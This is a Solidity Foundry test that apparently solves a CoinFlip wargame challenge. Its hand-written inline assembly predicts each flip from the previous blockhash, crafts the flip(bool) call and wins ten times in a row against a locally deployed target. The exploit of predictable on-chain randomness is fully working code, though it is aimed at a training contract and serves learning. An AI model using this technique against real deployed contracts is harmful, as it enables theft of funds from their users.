pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/CoinFlip.sol";

contract ASMCoinFlip is Test {
    CoinFlip public target;

    function setUp() public {
        target = new CoinFlip();
    }

    function _attack() internal {
        assembly {
            // initialize a pointer to free memory
            let ptr := mload(0x40)

            // load the target address from the storage slot
            let targetAddress := sload(target.slot)

            // store the bytes for the function signature at FMP
            mstore(ptr, "flip(bool)")

            // shuffle to fetch first 4 bytes
            // and align to the left of the word
            let h := shl(224, shr(224, keccak256(ptr, 0x0a)))

            // move the ptr past the stored word
            ptr := add(ptr, 0x0a)

            // store the function signature
            mstore(ptr, h)

            // we need to grab some data:
            let value := blockhash(sub(number(), 1))

            // the FACTOR
            let factor := shl(252, 0x8)

            // compute expected
            let expected := div(value, factor)

            // this should be lte 1
            if gt(expected, 1) {
                revert(0, 0)
            }

            // store
            mstore(add(ptr, 0x4), expected)

            // call the function
            let success := call(
                gas(), // gas
                targetAddress, // will be sending to target
                0, // send 0 wei
                ptr, // args offset - we can use our pointer
                0x24, // args length - selector (bytes4) + data (bytes32)
                add(ptr, 0x24), // return offset - after our data
                0x1 // return length - bool
            )

            // check we are successful
            if eq(success, 0) {
                revert(0, 0)
            }
        }
    }

    function testAttackCoinflip() public {
        for (uint256 i = 0; i < 10; i++) {
            _attack();
            vm.roll(block.number + 1);
        }
        assertEq(target.consecutiveWins(), 10);
    }
}
